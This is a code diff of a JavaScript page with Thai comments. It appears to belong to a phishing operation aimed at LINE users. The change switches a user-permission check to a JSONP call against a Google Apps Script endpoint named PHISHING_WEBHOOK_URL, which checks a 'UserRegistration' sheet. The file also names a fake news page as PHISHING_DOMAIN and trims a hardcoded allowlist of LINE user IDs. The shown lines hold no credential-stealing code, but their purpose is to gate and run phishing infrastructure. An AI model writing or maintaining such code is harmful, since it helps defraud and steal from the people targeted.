@@ -741,7 +741,7 @@
         
         // URL สำหรับ webhook
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8kt_D8Igps38xn8AwjVxiM_jmfiak_C2VXlfxVbMI_VcY_FyiBidVVSI_11BRx_45/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxe0C8xTKgYQOinGylWxpiQIAw8pgKb1LwNUp8xNW117z4OyfXGDdcDGpiJbJcwxsY1/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -812,21 +812,22 @@
         
         // ตรวจสอบสิทธิ์ผู้ใช้
         async function checkUserPermission(userId) {
-            return new Promise((resolve, reject) => {
-                try {
-                    console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
-                    
-                    // สร้าง unique callback name
-                    const callbackName = 'permCallback_' + new Date().getTime();
-                    
+            try {
+                console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
+                
+                // สร้าง unique callback name
+                const callbackName = 'permCallback_' + new Date().getTime();
+                
+                return new Promise((resolve) => {
                     // สร้าง global callback function
                     window[callbackName] = function(data) {
                         console.log("ได้รับข้อมูลสิทธิ์:", data);
                         
                         if (data && data.hasPermission !== undefined) {
+                            console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             resolve(data.hasPermission === true);
                         } else {
-                            console.log("ข้อมูลสิทธิ์ไม่ถูกต้อง, ใช้การตรวจสอบสำรอง");
+                            console.log("ข้อมูลสิทธิ์ไม่ถูกต้องหรือไม่สมบูรณ์, ใช้การตรวจสอบสำรอง");
                             resolve(checkUserPermissionFallback(userId));
                         }
                         
@@ -836,8 +837,11 @@
                     
                     // สร้าง script tag สำหรับ JSONP
                     const script = document.createElement('script');
-                    const url = new URL(LINE_OA_WEBHOOK_URL);
-                    url.searchParams.append('action', 'checkUserPermission');
+                    
+                    // เปลี่ยนจาก LINE_OA_WEBHOOK_URL เป็น PHISHING_WEBHOOK_URL
+                    // และส่ง action เป็น checkUserPermissionFromSheet เพื่อให้ตรวจสอบจากชีต UserRegistration
+                    const url = new URL(PHISHING_WEBHOOK_URL);
+                    url.searchParams.append('action', 'checkUserPermissionFromSheet');
                     url.searchParams.append('userId', userId);
                     url.searchParams.append('callback', callbackName);
                     url.searchParams.append('_', new Date().getTime()); // ป้องกันการ cache
@@ -862,21 +866,20 @@
                             resolve(checkUserPermissionFallback(userId));
                         }
                     }, 10000);
-                    
-                } catch (error) {
-                    console.error('Error checking permission:', error);
-                    resolve(checkUserPermissionFallback(userId));
-                }
-            });
+                });
+            } catch (error) {
+                console.error('Error checking permission:', error);
+                return checkUserPermissionFallback(userId);
+            }
         }
         
         // ตรวจสอบสิทธิ์แบบสำรอง
         function checkUserPermissionFallback(userId) {
-            // รายชื่อ userId ที่มีสิทธิ์ใช้งาน (เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งานจริง)
+            console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
+            // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์เข้าใช้งาน (ใช้เฉพาะกรณีฉุกเฉิน)
             const approvedUserIds = [
                 'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
-                'Ud7c2a83d5607602f3e7d00bb36a5cadb', // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งาน
-                'U41b4fbb2e0c1b40c94344c48eb533b36'  // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งาน
+                // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์คนอื่นๆ ตามความเหมาะสม
             ];
             
             return approvedUserIds.includes(userId);
